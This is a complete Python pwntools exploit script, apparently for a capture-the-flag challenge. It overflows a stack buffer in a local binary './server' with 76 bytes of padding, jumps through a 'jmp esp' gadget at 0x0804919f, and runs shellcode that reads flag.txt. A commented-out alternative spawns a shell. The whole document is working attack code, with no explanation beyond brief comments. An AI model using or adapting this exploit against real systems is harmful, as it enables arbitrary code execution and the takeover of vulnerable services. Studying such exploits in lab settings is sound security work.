#!/usr/bin/env python3

from pwn import *

exe = './server'

#this will automatically get context arch, bits , os etc
elf = context.binary = ELF( exe, checksec=False)

context.log_level = 'debug'

io = process(exe)

padding = 76

# Assembly byte sequence for 'jmp esp' so we can search for it
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

#print('-'*100)
#print(hex(jmp_esp))
#print('-'*100)

shellcode = asm(shellcraft.cat('flag.txt'))

# to get a shell
#shellcode = asm(shellcraft.sh())  # no need to specify x64 or any of that coz context.binary is set

shellcode += asm(shellcraft.exit())

payload = flat(
    asm('nop') * padding,
    jmp_esp,
    asm('nop') * 16, # this slack has to be nop instructions, cannot be AAAAA etc.
    shellcode
)

#Write payload to file
write("payload",payload)

#0x0804919f: jmp esp (ropper --file server --search "jmp esp")
io.sendlineafter(b':', b'\x00' * 76 + b'\x9f\x91\x04\x08' + b'\x00' * 16 + shellcode)

#io.sendlineafter(b':', payload)

io.interactive()

#print(io.recvall().decode('latin-1'))

